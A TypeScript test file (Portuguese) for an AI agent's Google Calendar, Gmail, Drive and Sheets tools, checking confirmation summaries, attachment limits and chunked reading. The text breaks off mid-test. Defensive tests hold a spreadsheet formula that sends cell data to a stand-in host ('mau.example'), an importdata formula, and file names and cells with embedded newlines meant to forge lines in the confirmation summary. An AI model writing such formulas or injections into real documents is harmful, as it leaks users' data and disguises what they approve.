import type { ToolContext, ToolDefinition } from "@/server/agents/core/types";
import { googleTools } from "@/server/agents/tools/google.tools";
import type { TextExtractor } from "@/server/integrations/documents/text-extractor";
import { GoogleNotConnectedError } from "@/server/services/google.service";
import { FakeGoogleWorkspace } from "../../setup/fake-google";

const ctx: ToolContext = { agentId: "a", conversationId: "c", channel: "WHATSAPP", userId: "u1" };
// Quinta-feira, 12 de novembro de 2026, 08:00 em Lisboa.
const now = () => new Date("2026-11-12T08:00:00Z");

const bytes = (text: string) => new TextEncoder().encode(text);

function setup(extractor?: TextExtractor, clock: () => Date = now) {
  const workspace = new FakeGoogleWorkspace();
  const asked: Array<string | null> = [];
  const tools = googleTools(
    {
      workspaceFor: async (userId) => {
        asked.push(userId);
        return workspace;
      },
    },
    clock,
    extractor,
  );
  /** Corre uma ferramenta como o runner: valida o input e executa. */
  const run = async (name: string, input: unknown) => {
    const tool = tools.find((t) => t.name === name) as ToolDefinition;
    return tool.execute(ctx, tool.schema.parse(input)) as Promise<Record<string, any>>; // eslint-disable-line @typescript-eslint/no-explicit-any
  };
  const tool = (name: string) => tools.find((t) => t.name === name)!;
  return { workspace, asked, tools, run, tool };
}

describe("ferramentas do Google", () => {
  it("as que escrevem exigem confirmação; as que só leem, não", () => {
    const { tools } = setup();
    const writes = tools.filter((t) => t.requiresConfirmation).map((t) => t.name);
    expect(writes.sort()).toEqual(
      [
        "agenda_alterar",
        "agenda_cancelar",
        "agenda_criar",
        "docs_criar",
        "gmail_enviar",
        "gmail_responder",
        "sheets_criar",
        "sheets_escrever",
      ].sort(),
    );
    expect(tools).toHaveLength(17);
    expect(new Set(tools.map((t) => t.name)).size).toBe(17);
  });

  it("agem na conta de quem fala com o agente", async () => {
    const t = setup();
    await t.run("contactos_procurar", { nome: "João" });
    expect(t.asked).toEqual(["u1"]);
  });

  it("sem conta ligada, o erro diz o que fazer", async () => {
    const [tool] = googleTools({
      workspaceFor: async () => {
        throw new GoogleNotConnectedError();
      },
    });
    await expect(
      tool.execute(ctx, tool.schema.parse({ de: "2026-11-12T00:00", ate: "2026-11-13T00:00" })),
    ).rejects.toThrow(/Integrações/);
  });
});

describe("agenda", () => {
  it("lista os compromissos com as horas de Lisboa", async () => {
    const t = setup();
    t.workspace.events = [
      {
        id: "e1",
        title: "Reunião com o João",
        start: "2026-07-01T14:00:00Z",
        end: "2026-07-01T15:00:00Z",
        allDay: false,
        attendees: ["joao@cliente.pt"],
        meetLink: "https://meet.google.com/abc",
        link: null,
        location: null,
      },
      {
        id: "e2",
        title: "Feriado",
        start: "2026-07-02",
        end: "2026-07-03",
        allDay: true,
        attendees: [],
        meetLink: null,
        link: null,
        location: null,
      },
    ];
    const result = await t.run("agenda_listar", {
      de: "2026-07-01T00:00",
      ate: "2026-07-03T00:00",
    });

    expect(result.compromissos).toEqual([
      {
        id: "e1",
        titulo: "Reunião com o João",
        inicio: "2026-07-01T15:00",
        fim: "2026-07-01T16:00",
        convidados: ["joao@cliente.pt"],
        meet: "https://meet.google.com/abc",
      },
      {
        id: "e2",
        titulo: "Feriado",
        inicio: "2026-07-02",
        fim: "2026-07-03",
        dia_inteiro: true,
        convidados: [],
      },
    ]);
    expect(t.workspace.calls[0]).toEqual([
      "listEvents",
      {
        from: new Date("2026-06-30T23:00:00Z"),
        to: new Date("2026-07-02T23:00:00Z"),
        query: undefined,
      },
    ]);
  });

  it("propõe os horários livres, sem as horas que já passaram", async () => {
    const t = setup();
    t.workspace.events = [
      {
        id: "e1",
        title: "Ocupado",
        start: "2026-11-12T10:00:00Z",
        end: "2026-11-12T16:30:00Z",
        allDay: false,
        attendees: [],
        meetLink: null,
        link: null,
        location: null,
      },
    ];
    const result = await t.run("agenda_horarios_livres", {
      de_dia: "2026-11-12",
      ate_dia: "2026-11-12",
    });

    expect(result.livres).toEqual([
      { inicio: "2026-11-12T09:00", fim: "2026-11-12T10:00" },
      { inicio: "2026-11-12T16:30", fim: "2026-11-12T18:00" },
    ]);
  });

  it("marca com Meet por omissão, na hora de Lisboa", async () => {
    const t = setup();
    const result = await t.run("agenda_criar", {
      titulo: "Reunião com o João",
      inicio: "2026-11-13T15:00",
      fim: "2026-11-13T15:30",
      convidados: ["joao@cliente.pt"],
    });

    expect(result.marcado).toMatchObject({
      titulo: "Reunião com o João",
      convidados: ["joao@cliente.pt"],
      meet: expect.stringContaining("meet.google.com"),
    });
  });

  it("recusa um fim antes do início, uma data mal escrita e um email inválido", () => {
    const { tool } = setup();
    const base = { titulo: "R", inicio: "2026-11-13T15:00", fim: "2026-11-13T15:30" };
    const criar = tool("agenda_criar").schema;
    expect(criar.safeParse(base).success).toBe(true);
    expect(criar.safeParse({ ...base, fim: "2026-11-13T14:00" }).success).toBe(false);
    expect(criar.safeParse({ ...base, inicio: "amanhã às 15h" }).success).toBe(false);
    expect(criar.safeParse({ ...base, convidados: ["o João"] }).success).toBe(false);
  });

  it("altera só o que foi pedido e cancela pelo id", async () => {
    const t = setup();
    await t.run("agenda_criar", {
      titulo: "R",
      inicio: "2026-11-13T15:00",
      fim: "2026-11-13T15:30",
    });
    await t.run("agenda_alterar", {
      id: "ev1",
      inicio: "2026-11-13T16:00",
      fim: "2026-11-13T16:30",
    });

    expect(t.workspace.calls.at(-1)).toEqual([
      "updateEvent",
      "ev1",
      expect.objectContaining({
        start: "2026-11-13T16:00",
        end: "2026-11-13T16:30",
        title: undefined,
      }),
    ]);
    await expect(t.run("agenda_cancelar", { id: "ev1" })).resolves.toEqual({ cancelado: true });
    expect(t.workspace.events).toEqual([]);
  });

  it("não vê mais de um mês de cada vez", async () => {
    const t = setup();
    await expect(
      t.run("agenda_horarios_livres", { de_dia: "2026-11-12", ate_dia: "2027-02-12" }),
    ).rejects.toThrow(/um mês/);
  });
});

describe("email, contactos, Drive e Docs", () => {
  it("procura emails com o limite por omissão e lê um pelo id", async () => {
    const t = setup();
    t.workspace.emails = [
      {
        id: "m1",
        from: "joao@cliente.pt",
        to: "eu",
        subject: "Fatura",
        date: "hoje",
        snippet: "…",
        unread: true,
        body: "Segue.",
        attachments: [],
      },
    ];
    const found = await t.run("gmail_procurar", { pesquisa: "from:joao" });
    expect(found.emails).toEqual([
      {
        id: "m1",
        from: "joao@cliente.pt",
        to: "eu",
        subject: "Fatura",
        date: "hoje",
        snippet: "…",
        unread: true,
      },
    ]);
    expect(t.workspace.calls[0]).toEqual(["searchEmails", "from:joao", 10]);
    await expect(t.run("gmail_ler", { id: "m1" })).resolves.toMatchObject({
      email: { body: "Segue." },
    });
  });

  it("envia um email", async () => {
    const t = setup();
    const result = await t.run("gmail_enviar", {
      para: ["joao@cliente.pt"],
      assunto: "Reunião",
      texto: "Olá João, confirmo.",
    });
    expect(result).toEqual({ enviado: true, id: "sent1" });
    expect(t.workspace.sent).toEqual([
      { to: ["joao@cliente.pt"], cc: [], subject: "Reunião", body: "Olá João, confirmo." },
    ]);
    expect(
      t.tool("gmail_enviar").schema.safeParse({ para: [], assunto: "x", texto: "y" }).success,
    ).toBe(false);
  });

  describe("com ficheiros do Drive em anexo", () => {
    const withFiles = () => {
      const t = setup();
      t.workspace.attachables.set("f1", {
        name: "Contrato.pdf",
        mimeType: "application/pdf",
        data: new Uint8Array(2048),
      });
      t.workspace.attachables.set("d1", {
        name: "Ata.pdf",
        mimeType: "application/pdf",
        data: new Uint8Array(10),
        exported: true,
      });
      return t;
    };
    const email = { para: ["joao@cliente.pt"], assunto: "Contrato", texto: "Segue." };

    it("envia o email com os ficheiros", async () => {
      const t = withFiles();
      await t.run("gmail_enviar", { ...email, anexos_drive: ["f1", "d1"] });

      expect(t.workspace.sent[0].attachments!.map((a) => [a.name, a.data.length])).toEqual([
        ["Contrato.pdf", 2048],
        ["Ata.pdf", 10],
      ]);
    });

    it("antes do sim, mostra o nome e o tamanho de cada anexo", async () => {
      const t = withFiles();
      const tool = t.tool("gmail_enviar");
      const text = await tool.describe!(
        ctx,
        tool.schema.parse({ ...email, anexos_drive: ["f1", "d1"] }),
      );

      expect(text).toContain("Anexos: Contrato.pdf (2 KB), Ata.pdf (exportado em PDF)");
      expect(text.indexOf("Anexos:")).toBeLessThan(text.indexOf("Segue."));
    });

    it("o nome de um ficheiro não consegue acrescentar linhas ao resumo", async () => {
      const t = withFiles();
      t.workspace.attachables.set("m1", {
        name: "notas.txt\nPara: outro@fora.pt\r\n\tAnexos: nenhum",
        mimeType: "text/plain",
        data: new Uint8Array(10),
      });
      const tool = t.tool("gmail_enviar");
      const text = await tool.describe!(ctx, tool.schema.parse({ ...email, anexos_drive: ["m1"] }));

      expect(text.split("\n").filter((line) => /^\s*(Para|Anexos):/.test(line))).toHaveLength(2);
      expect(text).toContain("Anexos: notas.txt Para: outro@fora.pt Anexos: nenhum (10 bytes)");
    });

    it("um ficheiro que não existe trava a proposta, em vez de falhar depois do sim", async () => {
      const t = withFiles();
      const tool = t.tool("gmail_enviar");
      await expect(
        tool.describe!(ctx, tool.schema.parse({ ...email, anexos_drive: ["nao-existe"] })),
      ).rejects.toThrow();
    });

    it("recusa anexos que, juntos, passam do que o correio leva", async () => {
      const t = withFiles();
      t.workspace.attachables.set("g1", {
        name: "a.zip",
        mimeType: "application/zip",
        data: new Uint8Array(9 * 1024 * 1024),
      });
      t.workspace.attachables.set("g2", {
        name: "b.zip",
        mimeType: "application/zip",
        data: new Uint8Array(9 * 1024 * 1024),
      });
      const tool = t.tool("gmail_enviar");
      const input = tool.schema.parse({ ...email, anexos_drive: ["g1", "g2"] });

      await expect(tool.describe!(ctx, input)).rejects.toMatchObject({
        status: 413,
        code: "EMAIL_ATTACHMENTS_TOO_LARGE",
      });
      await expect(tool.execute(ctx, input)).rejects.toMatchObject({ status: 413 });
      expect(t.workspace.sent).toEqual([]);
    });

    it("não aceita mais de cinco anexos de uma vez", () => {
      const { tool } = setup();
      expect(
        tool("gmail_enviar").schema.safeParse({
          ...email,
          anexos_drive: ["1", "2", "3", "4", "5", "6"],
        }).success,
      ).toBe(false);
    });

    it("uma resposta também pode levar anexos", async () => {
      const t = withFiles();
      t.workspace.emails = [
        {
          id: "m1",
          from: "joao@cliente.pt",
          to: "eu",
          subject: "Contrato",
          date: "hoje",
          snippet: "…",
          unread: false,
          body: "Pode enviar?",
          attachments: [],
        },
      ];
      const tool = t.tool("gmail_responder");
      const input = tool.schema.parse({ id: "m1", texto: "Segue.", anexos_drive: ["f1"] });

      expect(await tool.describe!(ctx, input)).toContain("Anexos: Contrato.pdf (2 KB)");
      await tool.execute(ctx, input);
      expect(t.workspace.sent[0]).toMatchObject({ threadId: "th-m1" });
      expect(t.workspace.sent[0].attachments).toHaveLength(1);
    });
  });

  it("procura contactos, ficheiros e cria documentos", async () => {
    const t = setup();
    t.workspace.contacts = [{ name: "João Silva", emails: ["joao@cliente.pt"], phones: [] }];
    t.workspace.files = [
      { id: "f1", name: "Contrato", mimeType: "application/pdf", link: "l", modifiedAt: null },
    ];

    await expect(t.run("contactos_procurar", { nome: "joão" })).resolves.toEqual({
      contactos: [{ nome: "João Silva", emails: ["joao@cliente.pt"], telefones: [] }],
    });
    await expect(t.run("drive_procurar", { pesquisa: "contrato" })).resolves.toMatchObject({
      ficheiros: [{ id: "f1", nome: "Contrato" }],
    });
    await expect(
      t.run("docs_criar", { titulo: "Ata", texto: "Presentes: Isabel." }),
    ).resolves.toEqual({
      criado: { id: "doc1", link: "https://docs.google.com/document/d/doc1/edit" },
    });
    expect(t.workspace.documents).toEqual([{ title: "Ata", text: "Presentes: Isabel." }]);
  });
});

describe("ler ficheiros do Drive", () => {
  it("devolve o texto de um ficheiro", async () => {
    const t = setup();
    t.workspace.contents.set("d1", {
      name: "Ata",
      mimeType: "text/plain",
      data: bytes("Presentes: a equipa."),
    });

    await expect(t.run("drive_ler", { id: "d1" })).resolves.toEqual({
      nome: "Ata",
      tipo: "text/plain",
      texto: "Presentes: a equipa.",
      total_caracteres: 20,
      cortado: false,
    });
  });

  it("corta um texto longo e continua de onde ficou", async () => {
    const t = setup();
    const long = "a".repeat(30_000) + "b".repeat(500);
    t.workspace.contents.set("d1", { name: "Longo", mimeType: "text/plain", data: bytes(long) });

    const first = await t.run("drive_ler", { id: "d1" });
    expect(first).toMatchObject({ total_caracteres: 30_500, cortado: true, continua_em: 30_000 });
    expect(first.texto).toBe("a".repeat(30_000));

    const rest = await t.run("drive_ler", { id: "d1", a_partir_de: first.continua_em });
    expect(rest).toMatchObject({ texto: "b".repeat(500), cortado: false });
    expect(rest.continua_em).toBeUndefined();
  });

  describe("a continuação de um texto longo", () => {
    const long = "a".repeat(30_000) + "b".repeat(500);
    const withLong = (clock?: () => Date) => {
      const t = setup(undefined, clock);
      t.workspace.contents.set("d1", { name: "Longo", mimeType: "text/plain", data: bytes(long) });
      return t;
    };

    it("não volta a descarregar o ficheiro", async () => {
      const t = withLong();
      await t.run("drive_ler", { id: "d1" });

      const rest = await t.run("drive_ler", { id: "d1", a_partir_de: 30_000 });

      expect(rest).toMatchObject({ nome: "Longo", texto: "b".repeat(500), cortado: false });
      expect(t.workspace.downloads).toEqual(["d1"]);
    });

    it("continua a exigir a conta Google ligada", async () => {
      const t = withLong();
      await t.run("drive_ler", { id: "d1" });
      await t.run("drive_ler", { id: "d1", a_partir_de: 30_000 });

      expect(t.asked).toEqual(["u1", "u1"]);
    });

    it("ler desde o início vai buscar o ficheiro como está agora", async () => {
      const t = withLong();
      await t.run("drive_ler", { id: "d1" });
      t.workspace.contents.set("d1", {
        name: "Longo",
        mimeType: "text/plain",
        data: bytes("novo"),
      });

      await expect(t.run("drive_ler", { id: "d1" })).resolves.toMatchObject({ texto: "novo" });
      expect(t.workspace.downloads).toEqual(["d1", "d1"]);
    });

    it("não serve a uma pessoa o que outra leu", async () => {
      const t = withLong();
      await t.run("drive_ler", { id: "d1" });
      const tool = t.tool("drive_ler") as ToolDefinition;

      await tool.execute(
        { ...ctx, userId: "u2" },
        tool.schema.parse({ id: "d1", a_partir_de: 30_000 }),
      );

      expect(t.workspace.downloads).toEqual(["d1", "d1"]);
    });

    it("passados dez minutos, vai buscar o ficheiro outra vez", async () => {
      const clock = { now: now() };
      const t = withLong(() => clock.now);
      await t.run("drive_ler", { id: "d1" });

      clock.now = new Date(now().getTime() + 11 * 60_000);
      await t.run("drive_ler", { id: "d1", a_partir_de: 30_000 });

      expect(t.workspace.downloads).toEqual(["d1", "d1"]);
    });

    it("um texto que coube inteiro não fica guardado", async () => {
      const t = setup();
      t.workspace.contents.set("d1", { name: "Ata", mimeType: "text/plain", data: bytes("curto") });
      await t.run("drive_ler", { id: "d1" });

      await t.run("drive_ler", { id: "d1", a_partir_de: 2 });

      expect(t.workspace.downloads).toEqual(["d1", "d1"]);
    });

    it("só guarda os dez textos mais recentes", async () => {
      const t = setup();
      for (let i = 0; i <= 10; i++) {
        t.workspace.contents.set(`d${i}`, { name: "L", mimeType: "text/plain", data: bytes(long) });
        await t.run("drive_ler", { id: `d${i}` });
      }
      t.workspace.downloads.length = 0;

      await t.run("drive_ler", { id: "d10", a_partir_de: 30_000 });
      expect(t.workspace.downloads).toEqual([]);
      await t.run("drive_ler", { id: "d0", a_partir_de: 30_000 });
      expect(t.workspace.downloads).toEqual(["d0"]);
    });

    it("um texto enorme não fica guardado em memória", async () => {
      const t = setup();
      t.workspace.contents.set("d1", {
        name: "Enorme",
        mimeType: "text/plain",
        data: bytes("a".repeat(2_000_001)),
      });
      await t.run("drive_ler", { id: "d1" });

      await t.run("drive_ler", { id: "d1", a_partir_de: 30_000 });

      expect(t.workspace.downloads).toEqual(["d1", "d1"]);
    });

    it("não corta um emoji a meio: fica inteiro para a fatia seguinte", async () => {
      const t = setup();
      const text = "a".repeat(29_999) + "😀" + "b".repeat(10);
      t.workspace.contents.set("d1", { name: "E", mimeType: "text/plain", data: bytes(text) });

      const first = await t.run("drive_ler", { id: "d1" });
      expect(first.texto).toBe("a".repeat(29_999));
      expect(first.continua_em).toBe(29_999);

      const rest = await t.run("drive_ler", { id: "d1", a_partir_de: first.continua_em });
      expect(rest.texto).toBe("😀" + "b".repeat(10));
    });

    it("vale também para os anexos de um email", async () => {
      const t = setup();
      t.workspace.attachmentContents.set("m1/1", {
        name: "contrato.txt",
        mimeType: "text/plain",
        data: bytes(long),
      });
      await t.run("gmail_ler_anexo", { email_id: "m1", parte: "1" });

      const rest = await t.run("gmail_ler_anexo", {
        email_id: "m1",
        parte: "1",
        a_partir_de: 30_000,
      });

      expect(rest).toMatchObject({ nome: "contrato.txt", texto: "b".repeat(500) });
      expect(t.workspace.downloads).toEqual(["m1/1"]);
    });
  });

  it("lê um CSV exportado de uma folha de cálculo", async () => {
    const t = setup();
    t.workspace.contents.set("s1", {
      name: "Despesas",
      mimeType: "text/csv",
      data: bytes("Data,Valor\n12/11,40"),
    });

    await expect(t.run("drive_ler", { id: "s1" })).resolves.toMatchObject({
      texto: "Data,Valor\n12/11,40",
    });
  });

  it("o tipo que o Drive diz vale mais do que a extensão do nome", async () => {
    const t = setup();
    t.workspace.contents.set("d1", {
      name: "relatorio.pdf",
      mimeType: "text/plain",
      data: bytes("Exportado de um Google Doc."),
    });

    await expect(t.run("drive_ler", { id: "d1" })).resolves.toMatchObject({
      texto: "Exportado de um Google Doc.",
    });
  });

  it("diz quando o ficheiro não tem texto que se leia", async () => {
    const t = setup({ extract: async () => "  \n " });
    t.workspace.contents.set("p1", {
      name: "Digitalizado.pdf",
      mimeType: "application/pdf",
      data: bytes("x"),
    });

    await expect(t.run("drive_ler", { id: "p1" })).rejects.toMatchObject({
      status: 422,
      message: expect.stringMatching(/não tem texto/),
    });
  });

  it("diz que tipos consegue ler quando o ficheiro é de outro", async () => {
    const t = setup();
    t.workspace.contents.set("i1", { name: "foto.png", mimeType: "image/png", data: bytes("x") });

    await expect(t.run("drive_ler", { id: "i1" })).rejects.toThrow(/não suportado/);
  });
});

describe("responder a emails e ler anexos", () => {
  const withEmail = () => {
    const t = setup();
    t.workspace.emails = [
      {
        id: "m1",
        from: "joao@cliente.pt",
        to: "eu",
        subject: "Fatura de outubro",
        date: "hoje",
        snippet: "…",
        unread: true,
        body: "Segue em anexo.",
        attachments: [{ partId: "1", fileName: "fatura.txt", mimeType: "text/plain", size: 12 }],
      },
    ];
    t.workspace.attachmentContents.set("m1/1", {
      name: "fatura.txt",
      mimeType: "text/plain",
      data: bytes("Total: 40 €"),
    });
    return t;
  };

  it("ao ler um email, mostra os anexos que traz", async () => {
    const t = withEmail();
    await expect(t.run("gmail_ler", { id: "m1" })).resolves.toMatchObject({
      email: { attachments: [{ partId: "1", fileName: "fatura.txt" }] },
    });
  });

  it("lê o texto de um anexo", async () => {
    const t = withEmail();
    await expect(t.run("gmail_ler_anexo", { email_id: "m1", parte: "1" })).resolves.toEqual({
      nome: "fatura.txt",
      tipo: "text/plain",
      texto: "Total: 40 €",
      total_caracteres: 11,
      cortado: false,
    });
  });

  it("responde dentro da conversa do email original", async () => {
    const t = withEmail();
    const result = await t.run("gmail_responder", { id: "m1", texto: "Recebido, obrigado." });

    expect(result).toEqual({ enviado: true, id: "sent1" });
    expect(t.workspace.sent).toEqual([
      {
        to: ["joao@cliente.pt"],
        cc: [],
        subject: "Re: Fatura de outubro",
        body: "Recebido, obrigado.",
        threadId: "th-m1",
        inReplyTo: "<m1@mail>",
        references: "<m1@mail>",
      },
    ]);
  });

  it("sem endereço para onde responder, nem chega a propor o envio", async () => {
    const t = withEmail();
    t.workspace.replyTarget = async () => ({
      threadId: "th-m1",
      to: [],
      cc: [],
      subject: "Re: Fatura",
      inReplyTo: "<m1@mail>",
      references: "<m1@mail>",
    });
    const tool = t.tool("gmail_responder");
    const input = tool.schema.parse({ id: "m1", texto: "Ok." });

    await expect(tool.describe!(ctx, input)).rejects.toMatchObject({
      status: 422,
      code: "EMAIL_WITHOUT_REPLY_ADDRESS",
    });
    await expect(tool.execute(ctx, input)).rejects.toMatchObject({ status: 422 });
    expect(t.workspace.sent).toEqual([]);
  });

  it("a todos, a resposta segue também para quem estava em cópia", async () => {
    const t = withEmail();
    await t.run("gmail_responder", { id: "m1", texto: "Ok.", responder_a_todos: true });
    expect(t.workspace.sent[0].cc).toEqual(["ana@cliente.pt"]);
  });
});

describe("folhas de cálculo", () => {
  const withSheet = () => {
    const t = setup();
    t.workspace.spreadsheets.set("s1", {
      title: "Despesas",
      sheets: ["2026", "2025"],
      values: [
        ["Data", "Valor"],
        ["12/11", 40],
      ],
    });
    return t;
  };

  it("sem intervalo, lê a primeira folha e diz que folhas há", async () => {
    const t = withSheet();

    await expect(t.run("sheets_ler", { id: "s1" })).resolves.toEqual({
      titulo: "Despesas",
      link: "https://sheets.test/s1",
      folhas: ["2026", "2025"],
      intervalo: "'2026'!1:200",
      linhas: [
        ["Data", "Valor"],
        ["12/11", 40],
      ],
      cortado: false,
    });
  });

  it("lê o intervalo pedido", async () => {
    const t = withSheet();
    await t.run("sheets_ler", { id: "s1", intervalo: "2025!A1:B5" });
    expect(t.workspace.calls).toContainEqual(["readCells", "s1", "2025!A1:B5"]);
  });

  it("de uma folha muito grande, devolve só as primeiras linhas e avisa", async () => {
    const t = withSheet();
    t.workspace.spreadsheets.get("s1")!.values = Array.from({ length: 450 }, (_, i) => [i]);

    const read = await t.run("sheets_ler", { id: "s1" });
    expect(read.linhas).toHaveLength(200);
    expect(read).toMatchObject({ cortado: true, continua_em: "'2026'!201:400" });
    // Só pede ao Google as linhas que vai mostrar, mais uma para saber se há mais.
    expect(t.workspace.calls).toContainEqual(["readCells", "s1", "'2026'!1:201"]);
  });

  it("seguindo continua_em, lê a folha toda e sabe quando acabou", async () => {
    const t = withSheet();
    t.workspace.spreadsheets.get("s1")!.values = Array.from({ length: 1000 }, (_, i) => [i]);

    const seen: unknown[] = [];
    let intervalo: string | undefined;
    for (let page = 0; page < 10; page++) {
      const read = await t.run("sheets_ler", { id: "s1", ...(intervalo ? { intervalo } : {}) });
      seen.push(...read.linhas);
      intervalo = read.continua_em;
      if (!intervalo) {
        expect(read.cortado).toBe(false);
        break;
      }
    }

    expect(seen).toHaveLength(1000);
    expect(seen.at(-1)).toEqual([999]);
  });

  it("a continuação de uma página cortada pelo texto não perde o resto da folha", async () => {
    const t = withSheet();
    t.workspace.spreadsheets.get("s1")!.values = Array.from({ length: 500 }, (_, i) => [
      i,
      "x".repeat(1000),
    ]);

    const read = await t.run("sheets_ler", { id: "s1", intervalo: "'2026'!201:400" });

    const shown = read.linhas.length;
    expect(shown).toBeLessThan(40);
    expect(read).toMatchObject({
      cortado: true,
      continua_em: `'2026'!${201 + shown}:${400 + shown}`,
    });
  });

  it("um intervalo de poucas linhas lê só o que foi pedido", async () => {
    const t = withSheet();
    t.workspace.spreadsheets.get("s1")!.values = Array.from({ length: 450 }, (_, i) => [i]);

    const read = await t.run("sheets_ler", { id: "s1", intervalo: "2026!5:10" });

    expect(read.linhas).toHaveLength(6);
    expect(read).toMatchObject({ cortado: false, intervalo: "2026!5:10" });
    expect(read.continua_em).toBeUndefined();
    expect(t.workspace.calls).toContainEqual(["readCells", "s1", "2026!5:10"]);
  });

  it("de um intervalo pedido com linhas a mais, devolve as primeiras e manda pedir em partes", async () => {
    const t = withSheet();
    t.workspace.spreadsheets.get("s1")!.values = Array.from({ length: 450 }, (_, i) => [i]);

    const read = await t.run("sheets_ler", { id: "s1", intervalo: "2026!A:A" });
    expect(read.linhas).toHaveLength(200);
    expect(read).toMatchObject({ cortado: true, total_linhas: 450 });
    expect(read.continua_em).toBeUndefined();
  });

  it("linhas com muito texto são cortadas antes de encherem a conversa", async () => {
    const t = withSheet();
    t.workspace.spreadsheets.get("s1")!.values = Array.from({ length: 100 }, () => [
      "x".repeat(1000),
    ]);

    const read = await t.run("sheets_ler", { id: "s1" });
    expect(read.linhas.length).toBeLessThan(40);
    expect(JSON.stringify(read.linhas).length).toBeLessThanOrEqual(31_000);
    expect(read).toMatchObject({
      cortado: true,
      continua_em: `'2026'!${read.linhas.length + 1}:${read.linhas.length + 200}`,
    });
  });

  it("cria uma folha de cálculo com as linhas dadas", async () => {
    const t = setup();

    await expect(
      t.run("sheets_criar", { titulo: "Despesas", linhas: [["Data", "Valor"]] }),
    ).resolves.toEqual({ criada: { id: "sheet1", link: "https://sheets.test/sheet1" } });
    expect(t.workspace.spreadsheets.get("sheet1")).toMatchObject({
      title: "Despesas",
      values: [["Data", "Valor"]],
    });
  });

  it("escreve por cima de um intervalo ou acrescenta ao fim, conforme o modo", async () => {
    const t = withSheet();

    await t.run("sheets_escrever", { id: "s1", intervalo: "2026!A2:B2", valores: [["13/11", 9]] });
    await t.run("sheets_escrever", {
      id: "s1",
      intervalo: "2026",
      valores: [["14/11", 12]],
      modo: "acrescentar",
    });

    expect(t.workspace.written).toEqual([
      { id: "s1", range: "2026!A2:B2", values: [["13/11", 9]], mode: "replace" },
      { id: "s1", range: "2026", values: [["14/11", 12]], mode: "append" },
    ]);
  });
});

describe("o resumo mostrado antes de confirmar", () => {
  const describeOf = async (t: ReturnType<typeof setup>, name: string, input: unknown) => {
    const tool = t.tool(name) as ToolDefinition;
    return tool.describe!(ctx, tool.schema.parse(input));
  };

  it("responder a um email: a quem, em que conversa, e o texto", async () => {
    const t = setup();
    t.workspace.emails = [
      {
        id: "m1",
        from: "joao@cliente.pt",
        to: "eu",
        subject: "Fatura de outubro",
        date: "hoje",
        snippet: "…",
        unread: false,
        body: "Segue.",
        attachments: [],
      },
    ];

    await expect(
      describeOf(t, "gmail_responder", { id: "m1", texto: "Recebido.", responder_a_todos: true }),
    ).resolves.toBe(
      "Responder na conversa «Fatura de outubro»\nPara: joao@cliente.pt\nCc: ana@cliente.pt\n\nRecebido.",
    );
  });

  it("não chega a propor responder a um email que não existe", async () => {
    const t = setup();
    await expect(describeOf(t, "gmail_responder", { id: "nada", texto: "x" })).rejects.toThrow(
      /não existe/,
    );
  });

  it("criar uma folha de cálculo: o título e como começam as linhas", async () => {
    const t = setup();

    await expect(describeOf(t, "sheets_criar", { titulo: "Despesas" })).resolves.toBe(
      "Criar a folha de cálculo «Despesas» no Google Sheets",
    );
    await expect(
      describeOf(t, "sheets_criar", {
        titulo: "Despesas",
        linhas: [
          ["Data", "Valor"],
          ["12/11", 40],
        ],
      }),
    ).resolves.toBe(
      "Criar a folha de cálculo «Despesas» no Google Sheets\n2 linhas:\nData | Valor\n12/11 | 40",
    );
  });

  it("escrever numa folha: o nome dela, onde, e o que vai ser escrito", async () => {
    const t = setup();
    t.workspace.spreadsheets.set("s1", { title: "Despesas", sheets: ["2026"], values: [] });

    await expect(
      describeOf(t, "sheets_escrever", {
        id: "s1",
        intervalo: "2026!A2:B2",
        valores: [["13/11", 9]],
      }),
    ).resolves.toBe(
      "Escrever na folha de cálculo «Despesas»\nIntervalo: 2026!A2:B2 (substitui o que lá estiver)\n1 linha:\n13/11 | 9",
    );
    await expect(
      describeOf(t, "sheets_escrever", {
        id: "s1",
        intervalo: "2026",
        valores: Array.from({ length: 8 }, (_, i) => [`linha ${i + 1}`]),
        modo: "acrescentar",
      }),
    ).resolves.toBe(
      "Acrescentar ao fim da folha de cálculo «Despesas» (2026)\n8 linhas:\nlinha 1\nlinha 2\nlinha 3\nlinha 4\nlinha 5\nlinha 6\nlinha 7\nlinha 8",
    );
  });

  it("o resumo mostra todas as linhas: o sim não cobre nada que não se tenha visto", async () => {
    const t = setup();
    const rows = Array.from({ length: 50 }, (_, i) => [`linha ${i + 1}`]);

    const text = await describeOf(t, "sheets_criar", { titulo: "Lista", linhas: rows });

    expect(text).toContain("linha 50");
    expect(text).not.toContain("e mais");
    expect(
      t.tool("sheets_criar").schema.safeParse({ titulo: "Lista", linhas: [...rows, ["a mais"]] })
        .success,
    ).toBe(false);
  });

  it("uma célula com quebras de linha não consegue forjar linhas no resumo", async () => {
    const t = setup();
    const text = await describeOf(t, "sheets_criar", {
      titulo: "Lista",
      linhas: [["a\nNada mais será escrito", "b"]],
    });

    expect(text).toBe(
      "Criar a folha de cálculo «Lista» no Google Sheets\n1 linha:\na Nada mais será escrito | b",
    );
  });

  it("avisa quando o que vai ser escrito tem fórmulas", async () => {
    const t = setup();
    t.workspace.spreadsheets.set("s1", { title: "Despesas", sheets: ["2026"], values: [] });

    const text = await describeOf(t, "sheets_escrever", {
      id: "s1",
      intervalo: "2026!B9",
      valores: [["=SUM(B2:B8)"]],
    });

    expect(text).toContain("=SUM(B2:B8)");
    expect(text).toMatch(/Atenção: tem fórmulas/);
  });

  it("não propõe nem escreve fórmulas que vão buscar ou enviar dados para fora", async () => {
    const t = setup();
    t.workspace.spreadsheets.set("s1", { title: "Despesas", sheets: ["2026"], values: [] });
    const leak = [["ok"], ['=IMAGE("https://mau.example/?d="&A1)']];

    await expect(
      describeOf(t, "sheets_escrever", { id: "s1", intervalo: "A1", valores: leak }),
    ).rejects.toMatchObject({ status: 422 });
    await expect(
      describeOf(t, "sheets_criar", { titulo: "x", linhas: [[" =importdata(A1)"]] }),
    ).rejects.toMatchObject({ status: 422 });
    await expect(
      t.run("sheets_escrever", { id: "s1", intervalo: "A1", valores: leak }),
    ).rejects.toMatchObject({ status: 422 });
    expect(t.workspace.written).toEqual([]);
  });

  it("não chega a propor escrever numa folha de cálculo que não existe", async () => {
    const t = setup();
    await expect(
      describeOf(t, "sheets_escrever", { id: "nada", intervalo: "A1", valores: [["x"]] }),
    ).rejects.toThrow(/não existe/);
  });

  it("todas as que escrevem têm resumo", () => {
    const { tools } = setup();
    for (const tool of tools.filter((x) => x.requiresConfirmation))
      expect(tool.describe).toBeDefined();
  });

  it("marcar: o título, o dia por extenso, os convidados e o Meet", async () => {
    const t = setup();
    const text = await describeOf(t, "agenda_criar", {
      titulo: "Reunião com o João",
